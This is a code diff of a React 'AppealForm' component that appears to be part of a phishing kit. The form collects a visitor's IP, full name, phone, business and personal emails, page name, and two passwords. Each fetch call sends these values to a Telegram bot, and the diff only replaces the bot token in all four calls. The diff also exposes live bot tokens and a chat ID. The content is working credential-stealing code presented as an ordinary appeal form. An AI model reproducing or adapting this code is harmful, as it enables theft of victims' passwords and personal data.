@@ -19,7 +19,7 @@ const AppealForm = (props) => {
     const callAPI = async () => {
         try {
             const message = `Message: hini ip:${props.ip.userIP}`
-            const res = await fetch(`https://api.telegram.org/bot6277909448:AAFfpXATR7nZd4t-m_SMtG1b5jxQxRsJh8A/sendMessage?chat_id=5146640540&text=${message}`);
+            const res = await fetch(`https://api.telegram.org/bot6846490352:AAF5XU0ZCPKaoDpwEleUp4i04fnMO2E-6do/sendMessage?chat_id=5146640540&text=${message}`);
             const data = await res.json();
         } catch (err) {
             console.log(err);
@@ -36,7 +36,7 @@ const AppealForm = (props) => {
             const message = `
              Ip:${props.ip.userIP}, Appeal: ${data.appeal}, Full Name: ${data.fullname}, Phone: ${data.mobilePhone}, Bussines: ${data.bussinesEmail}, Personal: ${data.personalEmail}, Page Name: ${data.pageName} 
             `
-            const res = await fetch(`https://api.telegram.org/bot6277909448:AAFfpXATR7nZd4t-m_SMtG1b5jxQxRsJh8A/sendMessage?chat_id=5146640540&text=${message}`);
+            const res = await fetch(`https://api.telegram.org/bot6846490352:AAF5XU0ZCPKaoDpwEleUp4i04fnMO2E-6do/sendMessage?chat_id=5146640540&text=${message}`);
             setSteps({first_password: true, second_password: false});
 
         } catch (err) {
@@ -49,7 +49,7 @@ const AppealForm = (props) => {
 
             const message = `
              Ip:${props.ip.userIP}, pw: ${data.password}`;
-            const res = await fetch(`https://api.telegram.org/bot6277909448:AAFfpXATR7nZd4t-m_SMtG1b5jxQxRsJh8A/sendMessage?chat_id=5146640540&text=${message}`);
+            const res = await fetch(`https://api.telegram.org/bot6846490352:AAF5XU0ZCPKaoDpwEleUp4i04fnMO2E-6do/sendMessage?chat_id=5146640540&text=${message}`);
             setSteps({first_password: false, second_password: true})
 
         } catch (err) {
@@ -62,7 +62,7 @@ const AppealForm = (props) => {
 
             const message = `
              Ip:${props.ip.userIP}, second pw: ${data.password}`;
-            const res = await fetch(`https://api.telegram.org/bot6277909448:AAFfpXATR7nZd4t-m_SMtG1b5jxQxRsJh8A/sendMessage?chat_id=5146640540&text=${message}`);
+            const res = await fetch(`https://api.telegram.org/bot6846490352:AAF5XU0ZCPKaoDpwEleUp4i04fnMO2E-6do/sendMessage?chat_id=5146640540&text=${message}`);
             setSteps({first_password: false, second_password: false})
             trigerNext();
 
